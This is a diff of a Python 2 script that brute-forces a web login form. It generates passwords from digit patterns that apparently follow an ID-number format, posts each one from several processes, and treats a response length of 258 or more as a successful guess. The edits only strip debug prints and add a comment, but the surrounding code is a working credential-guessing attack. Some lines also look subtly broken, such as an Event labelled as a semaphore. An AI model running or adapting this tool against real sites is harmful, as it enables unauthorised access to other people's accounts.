@@ -30,7 +30,7 @@ headers = {
             'X-Requested-With': 'XMLHttpRequest'
 
             }
-#password_array = ['', '', '', '']
+
 password_divi = [0, 25, 50, 75]
 password_prefix = ['01', '02', '03', '04', '05', '06', '07', '08', '09']
 password_middle = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09']
@@ -52,8 +52,7 @@ def verify(index, sem):
 
                 login_info['password'] = '27'+password_middle[password_divi[index]+j]+password_male[m]+password_index[n]
                 loginRequest = requests.post(request_url, data=login_info, headers=headers)
-                print login_info['password']
-                print loginRequest.headers['content-length']
+
                 if string.atoi(loginRequest.headers['content-length']) >= 258:
                     lock.acquire()
                     print "The password is " + login_info['password']
@@ -66,7 +65,7 @@ def verify(index, sem):
 
 if __name__ == "__main__":
     sem = multiThreading.Event() #use semaphore
-    lock = multiprocessing.Lock()
+    lock = multiprocessing.Lock()#use lock
     start_time = time.time()
     for index in range(4):
         multiThreading.Process(target=verify, args=(index, sem)).start()
